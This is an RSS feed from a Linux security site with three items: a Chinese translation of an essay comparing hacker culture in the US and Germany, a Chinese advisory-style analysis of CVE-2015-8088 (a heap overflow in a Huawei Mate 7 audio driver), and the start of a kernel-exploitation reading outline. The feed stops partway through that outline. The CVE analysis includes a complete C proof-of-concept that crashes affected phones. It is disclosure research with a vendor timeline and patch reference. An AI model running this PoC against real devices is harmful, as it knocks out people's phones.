<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Hardened GNU/Linux</title>
    <description>We are a group of free software enthusiasts, anarchists, cyber security researchers. Long live anarchy! Long live 0ld sch00l!!! A small step in security hardening --&gt; A giant leap in Free &amp; Open source software!!!
</description>
    <link>http://www.hardenedlinux.org/</link>
    <atom:link href="http://www.hardenedlinux.org/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sat, 13 Feb 2016 14:46:49 +0800</pubDate>
    <lastBuildDate>Sat, 13 Feb 2016 14:46:49 +0800</lastBuildDate>
    <generator>Jekyll v2.5.3</generator>
    
      <item>
        <title>HACKERS AND HEROES: A TALE OF TWO COUNTRIES</title>
        <description>&lt;p&gt;原文地址 &lt;a href=&quot;http://hackaday.com/2016/01/11/hackers-and-heroes-a-tale-of-two-countries/&quot;&gt;HACKERS AND HEROES: A TALE OF TWO COUNTRIES&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;译者：n3o4po11o&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/german-america.jpg&quot; alt=&quot;german-america&quot; /&gt;&lt;/p&gt;

&lt;p&gt;从很多方面来说，德国与美国的黑客文化都很相似，从软硬结合类型到相近的业余无线电到Blinkenlights。通过阅读Hackaday，你会发现两个国家都有类似的项目出现。在过去的10年中，两个国家都有大量黑客空间(hackerspace)出现。可能在你生活的城市中就有一两个:)。但生活在美国的黑客还缺少了一个德国黑客已经拥有的东西：尊重。&lt;/p&gt;

&lt;p&gt;在不同的圈子里提到”黑客”这个词，你永远不知道会得到什么样的回应。什么样的人才能算是”黑客”呢？是我们所提到的那些在Ashley Madison（婚外情网站）上通过账户信息来勒索的人吗？或者是从Target那里盗窃信用卡的那些人呢？还是那些花了大量的时间来破坏东西、创建东西以及拆解东西只是为了看看它们是如何工作的人？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/hacker_montage.png&quot; alt=&quot;hacker-montage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;关于”谁是&lt;a href=&quot;http://catb.org/~esr/jargon/html/H/hacker.html&quot;&gt;黑客&lt;/a&gt;“的讨论是一个非常古老的议题，当然了是基于互联网的标准，但它的含义不止步于此。但如果你仔细回想一下最近一次在主流媒体中听到关于”黑客”这个词，但不是贬义的情况。如果在本世纪你无法回想起这样的情况，那么你生活在美国。如果你回答”就昨天，刚在国内最重要的报纸中看到”，那么你生活在德国。&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;黑客在社会中的地位&lt;/h2&gt;

&lt;p&gt;激发我写这些的文章题为”&lt;a href=&quot;https://translate.google.com/translate?sl=auto&amp;amp;tl=en&amp;amp;js=y&amp;amp;prev=_t&amp;amp;hl=en&amp;amp;ie=UTF-8&amp;amp;u=http%3A%2F%2Fwww.sueddeutsche.de%2Fdigital%2Fchaos-computer-club-warum-hacker-so-wichtig-fuer-die-gesellschaft-sind-1.2798088&amp;amp;edit-text=&amp;amp;act=url&quot;&gt;为什么黑客对社会这么重要(Why Hackers are so Important for Society)&lt;/a&gt;.”我们彼此都心知肚明，因为我们将一个东西拆解以后从最底层来了解整个东西的原理：从消费电子到加密协议。但回过头来想想，如果是从美国的报纸上读到关于黑客的头条呢？   &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/800px-piratenpartei_deutschland_logo-svg.png&quot; alt=&quot;Pirate-party&quot; /&gt;&lt;/p&gt;

&lt;p&gt;德国黑客受到了很多的尊重，德国政府经常在IT安全，电子投票机，数据自由以及其他类似的领域采纳混沌计算机俱乐部&lt;a href=&quot;http://ccc.de/en&quot;&gt;(Chaos Computer Club,CCC)&lt;/a&gt;的意见。当CCC有故事要发布时，那些媒体，甚至和计算机无关的媒体都会去。海盗聚会(The Pirate Party)，由名为c-base的黑客空间所创办，在2012获得了足够高的投票在4个州议会有了议席，并在欧洲议会有了一个议席。当然了不是没一个德国人都觉得“”黑客”是好的，但从媒体的态度、政治以及社会影响上来看比起美国好了太多。   &lt;/p&gt;

&lt;p&gt;值得思考的是，这是如何实现的以及有什么建议可以给美国的黑客圈子。我没办法说我有所有的答案。部分的文章是为了通过比较引出一个话题。但重要的是思考为什么美国的黑客会被排斥而在德国的黑客就(几乎)和社会的普通群体一样呢，特别是在公开辩论需要更多的技术背景的情况下。   &lt;/p&gt;

&lt;h2 id=&quot;hacking-on-the-phone&quot;&gt;HACKING ON THE PHONE&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/images/war_games.jpg&quot; alt=&quot;War-games&quot; /&gt;
© Metro-Goldwyn-Mayer Studios Inc. All Rights Reserved.&lt;/p&gt;

&lt;p&gt;旁边这张美国黑客的照片是一个男人，甚至可能是一个青少年，独自一人接连几个小时试图攻破AT&amp;amp;T公司的系统或者在玩&lt;a href=&quot;https://en.wikipedia.org/wiki/WarGames&quot;&gt;War Game&lt;/a&gt;。在20世纪80年代这样的行为没有太大的错误，当然除了孤独的那部分。当时有一群人(phone phreaks)黑了电话，使其能够用来(非法)拨打免费电话。但他们通常团伙行动，彼此分享信息。免费的信息共享在&lt;a href=&quot;https://en.wikipedia.org/wiki/Legion_of_Doom_%28hacking%29&quot;&gt;毁灭军团(Legion of Doom’s)&lt;/a&gt;创办的&lt;a href=&quot;http://www.textfiles.com/magazines/LOD/&quot;&gt;杂志&lt;/a&gt;,&lt;a href=&quot;http://phrack.org/&quot;&gt;Phrack&lt;/a&gt;,&lt;a href=&quot;http://www.2600.com/&quot;&gt;2600&lt;/a&gt;以及无数的论坛(BBSes)中，并且都是开放的，但如果你访问过，这将是一个非常令人激动的事。   &lt;/p&gt;

&lt;p&gt;在当时，AT&amp;amp;T对长途电话进行垄断，并且价格很不合理。为了让一群志同道合的技术黑客能够一起进行交流，或者拨入境外的论坛，他们几乎必须要闯入AT&amp;amp;T的系统。这也成就了电话网络为当时最有趣也最富有挑战性的信息技术。但常见的关于电话phreaks的帖子都围绕着让彼此能够通信，也止步于此。&lt;/p&gt;

&lt;p&gt;德国黑客当时也处于非常类似的情况。德国也有电话垄断，但它比美国的AT&amp;amp;T限制性更大。在德国，不仅你只有一个电话运营商(&lt;a href=&quot;https://en.wikipedia.org/wiki/Deutsche_Bundespost&quot;&gt;Deutsche Bundespost&lt;/a&gt;)，而且运营商还是联邦政府所拥有的，也是当时最大的雇主。Bundespost可以通过法律要求用户使用特定的设备来接入网络,其中包含了一个在80年代来说贵得离谱的调制解调器(modem)。CCC早期有一些关于电话phreaking是针对Bundespost，这些的话，我将它归到”肯定会对其的合法性与道德产生争议”的目录，但这些活动同样将价格可接受的DIY modem带到了平常人的生活在，让他们能够彼此通信。虽然这个行为在法律上不合法，但我觉得在道德上是正确的，并且从技术上来说，这样的东西太酷了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/akustikkoppler_ccc_datenklo.jpg&quot; alt=&quot;Datenklo&quot; /&gt;
Photo: Johann H. Addicks / addicks@gmx.net   &lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.offiziere.ch/trust-us/habi1/097_datenklo.html&quot;&gt;Datenklo&lt;/a&gt;(&lt;a href=&quot;https://translate.google.com/translate?sl=auto&amp;amp;tl=en&amp;amp;js=y&amp;amp;prev=_t&amp;amp;hl=en&amp;amp;ie=UTF-8&amp;amp;u=http%3A%2F%2Fwww.offiziere.ch%2Ftrust-us%2Fhabi1%2F097_datenklo.html&amp;amp;edit-text=&amp;amp;act=url&quot;&gt;谷歌翻译版&lt;/a&gt;)是一个运行在300比特率基于声音耦合的DIY modem。它的名字由”数据(data)”和”厕所(toilet)”两个单词混合而成。因为用来隔绝话筒的橡胶环和厕所密封管道用的材料大小是一样的。&lt;/p&gt;

&lt;p&gt;不好意思，跑题了;-)20世纪80年代早期在美国和德国的黑客行为主要分为”合法”以及”没那么合法”，人群主要为那些热爱探索技术以及热爱数字通信与打印媒体的人。当时所有人都通过电话phreaking来对抗运营商的垄断，因此他们能够聚在一起在背后偷偷谈论电话系统是如何运作并不被发现。因为当时最酷的就是进入电话系统。&lt;/p&gt;

&lt;p&gt;但接下来旅程变得不一样了。在20世纪90年代，美国的黑客们被排斥并且大多都分散在不同的地方，与此同时德国黑客们已经形成了一个强大的全国性组织，并在几个城市有了分舵。&lt;/p&gt;

&lt;h3 id=&quot;the-turn&quot;&gt;转变(THE TURN)&lt;/h3&gt;

&lt;p&gt;在美国，电话phreaking的黄金时代在1990年结束了，因为当时美国特勤局查封了很多用来架设论坛以及为黑客们提供服务的服务器。绝大部分的电话飞客(phreacks)都潜入地下了。黑客小组被当作“黑帮”来对待，并且在论坛上讨论电话系统内部的原理的人越来越多是为了犯罪而不是为了普通交流。数百台运行着可疑论坛的电脑被扣押数个月到数年，有的甚至都没有被起诉！于此同时美国政府将之前实施的用于保护政府电脑的法律&lt;a href=&quot;https://en.wikipedia.org/wiki/United_States_v._Morris_%281991%29&quot;&gt;延伸到了在互联网上的每一台电脑&lt;/a&gt;。
&lt;img src=&quot;/images/us-secretservice-starlogo.png&quot; alt=&quot;US-Secret-Services&quot; /&gt;
总的来说，这些事让美国的hacking”一夜回到解放前”。Hacking被认为是犯罪的行为，很多黑客团队都解散了，甚至有一小部分人遭受了牢狱之灾。Hacking在美国的所有社区都发生了翻天覆地的变化，至少有一段时间变得寂静，或者被迫要在地下世界里才拥有一片小天地。Bruce Sterling的&lt;a href=&quot;https://stuff.mit.edu/hacker/hacker.html&quot;&gt;The Hacker Crackdown&lt;/a&gt;在phreaking的后黄金时代是一本非常经典的编年史。&lt;/p&gt;

&lt;p&gt;在1990年，回过头来看&lt;a href=&quot;http://www.nytimes.com/1981/07/26/business/case-of-the-purloined-password.html?pagewanted=3&amp;amp;pagewanted=all&quot;&gt;纽约时报在1981年&lt;/a&gt;对于黑客已经”过时”的描述，不仅让人感到悲伤：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;黑客为技术上的专家;技艺精湛，通常很年轻，程序员，总是带着奇思秒想来试探计算机系统的防御系统，总是探寻着机器的极限和可能性，尽管他们总是看起来像是在破坏系统，在计算机行业中是重要的资产，通常来说非常有价值。   &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;公众的舆论已经将黑客认为是离经叛道的人或者是罪犯。&lt;/p&gt;

&lt;h3 id=&quot;l0pht-heavy-industries&quot;&gt;L0PHT HEAVY INDUSTRIES&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/images/l0pht_logo.gif&quot; alt=&quot;L0pht&quot; /&gt;
但黑客总要hack点东西，大量根据地理分布而聚集在一起的黑客团队放弃了本地的活动。在20世纪90年代，&lt;a href=&quot;http://www.l0pht.com/&quot;&gt;L0pht&lt;/a&gt;为地上世界“存在”的黑客团队。但问题是这个“l0pht”和常见的黑客空间(hackerspace)一样:full of junk (ahem, inspirational technological raw material) and computers and smart folks interested in all of the above.&lt;/p&gt;

&lt;p&gt;在早期，L0pht有一堆好的文章，比如下面这篇&lt;a href=&quot;http://www.nytimes.com/1999/10/03/magazine/hack-counterhack.html?scp=2&amp;amp;sq=l0pht%20heavy&amp;amp;st=cse&quot;&gt;纽约时报上的文章&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;可能美国的黑客与政府关系的高潮是当我们看到l0pht里的7个成员在美国参议院里为自己涉及美国国家安全的&lt;a href=&quot;https://www.youtube.com/watch?v=VVJldn_MmMY&quot;&gt;活动作证&lt;/a&gt;。参议员Fred Thompson为了减少打击介绍他们为“黑客智库”给其他参议员。有趣的是，最开始L0pht与政府扯上关系只是一个由&lt;a href=&quot;https://www.youtube.com/watch?v=axnWyPEly84&amp;amp;t=11m42s&quot;&gt;Mudge实施的防御演习&lt;/a&gt;，是为了提升名气并避免任何误解（不想被抓）。   &lt;/p&gt;

&lt;p&gt;来自L0pht的人们最后成为了Full Disclosure的早期拥护者，不管是&lt;a href=&quot;https://en.wikipedia.org/wiki/Responsible_disclosure&quot;&gt;负责任的揭露&lt;/a&gt;还是其他的形式。在20世纪90年代，他们的advisories是每一个对hacking和计算机安全有兴趣的人必读的读物。尽管L0pht所从事的事情并非所有都是严格意义上来说合法的，但可以确定的事他们正在做正确的事：正处于混沌中立与混沌善良之间。华盛顿邮报写了一个&lt;a href=&quot;http://www.washingtonpost.com/sf/business/2015/06/22/net-of-insecurity-part-3/&quot;&gt;关于l0pht的文章&lt;/a&gt;应该在你的阅读列表当中。&lt;/p&gt;

&lt;p&gt;我觉得l0pht最厉害的事为他们成为了一个“存在实体”的团队，而且他们对于修复有问题的东西有着强烈的动力，因为他们在公众中有着很高的知名度，所以他们清楚他们正在被监视。and there was an incentive to “behave” or at least to appear to be behaving. They got flack from both the black-hat hacker community for having “sold out” and from the software industry for being rogues.这是他们脚踏黑白两道的标志。而且，他们是有组织有计划的。   &lt;/p&gt;

&lt;p&gt;接着，L0pht停止经营成一个hackerspace，转而成为一个安全企业。他们成员根据自己商业模式不同都分离出去了。可以这么说，L0pht这个团队的后期，根据利益点的不同，有的成为hacking认证的商业公司，有的成为安全企业。在20世纪90年代后的美国，”hacking”在商业上并不成功。白帽黑客（也就是我们所知的“安全研究员”）和黑帽黑客之间的分歧越来越明显。一面是高薪，一面是合法的环境，在这样的大环境下，留给像l0pht这样处于中间的机会已经不多了。这对于美国的黑客文化是一个非常危险坑，特别是对于那些没有足够的水平到喜欢玩弄计算机的年轻人。在整个文化中，他们要处于什么位置呢？&lt;/p&gt;

&lt;h3 id=&quot;today-the-usa-tomorrow-germany&quot;&gt;TODAY THE USA, TOMORROW GERMANY&lt;/h3&gt;

&lt;p&gt;在美国的黑客文化中，从开放和社区化到全面潜入地下(underground)绕了很长的远路(除了剩下几个在公众的视野当中)。明天，我将从19世纪80年代开始，讲述同一时期德国的黑客历史，讨论一下两国的黑客场景以及美国的黑客可以从中学习的地方。如果你同意这个观点，在美国的黑客场景下还有很多工作可以做。敬请期待。&lt;/p&gt;
</description>
        <pubDate>Sat, 13 Feb 2016 06:05:05 +0800</pubDate>
        <link>http://www.hardenedlinux.org/translation/2016/02/13/Hackers-and-heroes-a-tale-of-two-countries.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/translation/2016/02/13/Hackers-and-heroes-a-tale-of-two-countries.html</guid>
        
        
        <category>translation</category>
        
      </item>
    
      <item>
        <title>CVE-2015-8088: 华为智能手机HiFi驱动堆溢出</title>
        <description>&lt;p&gt;Shawn：感谢Pray3r的分享，驱动一直以来都是linux内核的重灾区，要以不断修复bug的方式去防御漏洞几乎是1990年代的方案，另外一方面，作为厂商也应该加大代码审计的投入。这篇分析的&lt;a href=&quot;https://raw.githubusercontent.com/citypw/DNFWAH/master/5/d5_0x03_DNFWAH_cve-2015-8088-heap-overflow-analysis.txt&quot;&gt;英文版已经分享到了DNFWAH Issue 5&lt;/a&gt;上。&lt;/p&gt;

&lt;p&gt;By Pray3r&lt;/p&gt;

&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;/dev/hifi_misc&lt;/code&gt; 是用户空间到内核空间中Hisi 芯片的一个接口，该接口和Hifi相关。我们看到&lt;code&gt;drivers/hisi/hifidsp/hifi_lpp.c&lt;/code&gt;中的代码，攻击者可以在用户空间下，可以使用&lt;code&gt;HIFI_MISC_IOCTL_WRITE_PARAMS&lt;/code&gt;参数，并通过调用&lt;code&gt;ioctl()&lt;/code&gt;执行到该代码路径：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;static long hifi_misc_ioctl(struct file *fd, unsigned int cmd, unsigned long arg)
{
[...]
	switch(cmd) {
		[...]
		case HIFI_MISC_IOCTL_WRITE_PARAMS : /* write algo param to hifi*/
			ret = hifi_dsp_write_param(arg);
		        break;
		[...]
	}
[...]
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;之后，&lt;code&gt;hifi_dsp_write_param()&lt;/code&gt;函数被调用，它的参数来自用户空间：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;int hifi_dsp_write_param(unsigned long arg)
{
	int ret = OK;
	phys_addr_t hifi_param_phy_addr = 0;
	void*		hifi_param_vir_addr = NULL;
	CARM_HIFI_DYN_ADDR_SHARE_STRU* hifi_addr = NULL;
	struct misc_io_sync_param para;
[...]
	if (copy_from_user(&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;para, (void*)arg, sizeof(struct misc_io_sync_param))) {  // arg --&amp;gt; para
		loge(&amp;quot;copy_from_user fail.\n&amp;quot;);
		ret = ERROR;
		goto error1;
	}
[...]
	hifi_param_vir_addr = (unsigned char*)ioremap(hifi_param_phy_addr, SIZE_PARAM_PRIV); // heap alloc
	if (NULL == hifi_param_vir_addr) {
		loge(&amp;quot;hifi_param_vir_addr ioremap fail\n&amp;quot;);
		ret = ERROR;
		goto error2;
	}
[...]
	ret = copy_from_user(hifi_param_vir_addr, para.para_in, para.para_size_in); // heap overflow
	if ( ret != 0) {
		loge(&amp;quot;copy data to hifi error! ret = %d&amp;quot;, ret);
	}
[...]
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;参数&lt;code&gt;arg&lt;/code&gt;是一个结构体指针，指向用户空间的内存。&lt;code&gt;hifi_dsp_write_param()&lt;/code&gt;函数初始化之后，使用&lt;code&gt;copy_from_user()&lt;/code&gt;将用户空间的数据&lt;code&gt;(arg)&lt;/code&gt;拷贝到内核空间中&lt;code&gt;(para)&lt;/code&gt;。注意，它没做任何验证，就将用户空间下的所用的成员变量拷贝到内核空间中。&lt;code&gt;para&lt;/code&gt;结构如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;struct misc_io_sync_param {
	void *                  para_in;          
	unsigned int            para_size_in;      
	void *                  para_out;          
	unsigned int            para_size_out;  
};&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;紧接着，又调用了&lt;code&gt;copy_from_user(hifi_param_vir_addr,
  para.para_in, para.para_size_in)&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;hifi_param_vir_addr&lt;/code&gt;指向一块由&lt;code&gt;ioremap()&lt;/code&gt;分配的堆内存，这块堆内存的大小为&lt;code&gt;SIZE_PARAM_PRIV&lt;/code&gt;(200 * 1024)字节。&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;para.para_in&lt;/code&gt;指针由用户空间控制，它是存储数据的内存。&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;para.para_size_in&lt;/code&gt;是一个&lt;code&gt;unsigned int&lt;/code&gt;由用户空间控制，它是&lt;code&gt;para.para_in&lt;/code&gt;的大小。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;然而，代码中没有对&lt;code&gt;para.para_in&lt;/code&gt;和&lt;code&gt;para.para_size_in&lt;/code&gt;进行验证，如果&lt;code&gt;para.para_size_in&lt;/code&gt;大于&lt;code&gt;200 * 1024&lt;/code&gt;,例如&lt;code&gt;300 * 1024&lt;/code&gt;，将产生一个堆溢出。PoC如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;/*
 *
 *  HuaWei Mate7 hifi driver Poc
 *
 *  Writen by pray3r&lt;span class=&quot;nt&quot;&gt;&amp;lt;pray3r.z&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;gmail&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 *
 */

#include &lt;span class=&quot;nt&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;
#include &lt;span class=&quot;nt&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
#include &lt;span class=&quot;nt&quot;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;
#include &lt;span class=&quot;nt&quot;&gt;&amp;lt;sys&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
#include &lt;span class=&quot;nt&quot;&gt;&amp;lt;sys&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;stat&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
#include &lt;span class=&quot;nt&quot;&gt;&amp;lt;sys&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ioctl&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

#define HIFI_MISC_IOCTL_WRITE_PARAMS    _IOWR(&amp;#39;A&amp;#39;, 0x75, struct misc_io_sync_param)

struct misc_io_sync_param {
	void *                  para_in;           
	unsigned int            para_size_in;       
	void *                  para_out;           
	unsigned int            para_size_out;   
};

int main(int arg, char **argv)
{
	int fd; 
	void *in = malloc(300 * 1024);
	void *out = malloc(100);
	struct misc_io_sync_param poc;

	poc.para_in = in;
	poc.para_size_in = 300 * 1024;
	poc.para_out = out;
	poc.para_size_out = 100;

	fd = open(&amp;quot;/dev/hifi_misc&amp;quot;, O_RDWR);

	ioctl(fd, HIFI_MISC_IOCTL_WRITE_PARAMS, &lt;span class=&quot;ni&quot;&gt;&amp;amp;poc);&lt;/span&gt;

	free(in);
	free(out);

	return 0;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;执行这个PoC将导致Mate 7崩溃，请注意，该PoC至少需要在audio或system用户下执行，因为&lt;code&gt;/dev/hifi_misc&lt;/code&gt;在audio和system用户下才有可写的权限。&lt;/p&gt;

&lt;h3 id=&quot;impact&quot;&gt;Impact&lt;/h3&gt;

&lt;p&gt;给&lt;code&gt;para.para_size&lt;/code&gt;设置一个很大的值，手机会崩溃，但是想利用这个漏洞提权是非常困难的，因为在&lt;code&gt;ioremap()&lt;/code&gt;[1]的实现调用了&lt;code&gt;get_vm_area_node()&lt;/code&gt;，这个函数总是会设置PAGE_SIZE大小的保护页。&lt;/p&gt;

&lt;p&gt;感谢Dan Rosenberg的指点。[2]&lt;/p&gt;

&lt;h3 id=&quot;affected&quot;&gt;Affected&lt;/h3&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;Model   : HUAWEI MT7-TL10
Version : MT7-TL10V100R001CHNC00B133
Android : 4.4.2
Kernel  : 3.10.30-00015-g049a08f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;其它类似的华为手机可能也受影响。&lt;/p&gt;

&lt;h3 id=&quot;patch&quot;&gt;Patch&lt;/h3&gt;

&lt;p&gt;参考华为官网的信息： &lt;br /&gt;
 &lt;a href=&quot;http://www1.huawei.com/en/security/psirt/security-bulletins/security-advisories/hw-460347.htm&quot;&gt;http://www1.huawei.com/en/security/psirt/security-bulletins/security-advisories/hw-460347.htm&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;timeline&quot;&gt;TimeLine&lt;/h3&gt;

&lt;p&gt;Sep 28 2015 - Report sent to Huawei PSIRT &lt;br /&gt;
 Sep 10 2015 - Huawei confirmed the security issues &lt;br /&gt;
 Nov 04 2015 - Huawei fixed and public the security issues &lt;br /&gt;
 Nov 09 2015 - Update CVE number   &lt;/p&gt;

&lt;h3 id=&quot;reference&quot;&gt;Reference&lt;/h3&gt;
&lt;p&gt;[1]. http://lxr.free-electrons.com/source/mm/vmalloc.c#L1351
[2]. http://seclists.org/oss-sec/2015/q4/532&lt;/p&gt;
</description>
        <pubDate>Wed, 20 Jan 2016 10:46:24 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2016/01/20/cve-2015-8088-analysis.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2016/01/20/cve-2015-8088-analysis.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>An Introduction to Linux Kernel Exploitation</title>
        <description>&lt;p&gt;By Pray3r&lt;/p&gt;

&lt;h3 id=&quot;about-this-documentation&quot;&gt;-[ 0. About this documentation&lt;/h3&gt;
&lt;p&gt;I am researching linux kernel exploitation for the outline and reference books/papers. I will keep update this list and share some of my findings on &lt;a href=&quot;http://hardenedlinux.org&quot;&gt;HardenedLinux&lt;/a&gt;. If you have any questions or suggestions don’t hesitate to contact &lt;a href=&quot;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#116;&amp;#111;:&amp;#112;&amp;#114;&amp;#097;&amp;#121;&amp;#051;&amp;#114;&amp;#046;&amp;#122;&amp;#064;&amp;#103;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#046;&amp;#099;&amp;#111;&amp;#109;&quot;&gt;me&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;review&quot;&gt;-[ 1. Review&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Linux Memory Management&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;-[ 2. Exploitation&lt;/h3&gt;

&lt;h4 id=&quot;attack-surface&quot;&gt;-[ 2.1 Attack Surface&lt;/h4&gt;

&lt;h4 id=&quot;a-taxonomy-of-kernel-vulnerabilities&quot;&gt;-[ 2.2 A Taxonomy of Kernel Vulnerabilities&lt;/h4&gt;

&lt;h4 id=&quot;finding-vulnsbugs&quot;&gt;-[ 2.3 Finding VULNS/BUGS&lt;/h4&gt;

&lt;h5 id=&quot;fuzzing&quot;&gt;-[ 2.3.1 Fuzzing&lt;/h5&gt;
&lt;p&gt;Reading/Modifying these tools’ code, and I try to write new one.
- &lt;a href=&quot;https://github.com/kernelslacker/trinity&quot;&gt;trinity&lt;/a&gt;
- &lt;a href=&quot;https://github.com/google/kasanf&quot;&gt;kasan&lt;/a&gt;&lt;/p&gt;

&lt;h5 id=&quot;code-audit&quot;&gt;-[ 2.3.2 Code Audit&lt;/h5&gt;

&lt;h4 id=&quot;kernel-exploitation&quot;&gt;-[ 2.4 Kernel Exploitation&lt;/h4&gt;

&lt;h4 id=&quot;bypass-self-protection-stable-exploit&quot;&gt;-[ 2.5 Bypass Self-protection (Stable Exploit)&lt;/h4&gt;

&lt;h3 id=&quot;reference-books&quot;&gt;-[ 3. Reference Books&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Linux Kernel Development, 3rd Edition – &lt;em&gt;Robert Love&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Linux-Kernel-Development-3rd-Edition/dp/0672329468&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;Understand Linux Kernel, 3rd Edition – &lt;em&gt;Daniel P. Bovet, Marco Cesati&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Understanding-Linux-Kernel-Third-Edition/dp/0596005652&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;Linux Device Drivers, 3rd  Edition – &lt;em&gt;Jonathan Corbet, Alessandro Rubini, Greg Kroah-Hartman&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Linux-Device-Drivers-3rd-Edition/dp/0596005903&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;Understanding Linux Network Internals – &lt;em&gt;Christian Benvenuti&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Understanding-Network-Internals-Christian-Benvenuti/dp/0596002556&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;Understanding The Linux Virtual Memory Manager – &lt;em&gt;Mel Gorman&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.ca/Understanding-Linux-Virtual-Memory-Manager/dp/0131453483&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;A Bug Hunter’s Diary: A Guided Tour Through the Wilds of Software Security – &lt;em&gt;Tobias Klein&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Bug-Hunters-Diary-Software-Security/dp/1593273851&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;Hacking: The Art of Exploitation, 2nd Edition – &lt;em&gt;Jon Erickson&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Hacking-The-Art-Exploitation-Edition/dp/1593271441&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;A Guide to Kernel Exploitation: Attacking the Core –  &lt;em&gt;Enrico Perla B.Sc. Computer Science University of Torino M.Sc. Computer Science Trinity College Dublin, Massimiliano Oldani&lt;/em&gt; [&lt;a href=&quot;http://www.amazon.com/Guide-Kernel-Exploitation-Attacking-Core/dp/1597494860&quot;&gt;Amazon&lt;/a&gt;]&lt;/li&gt;
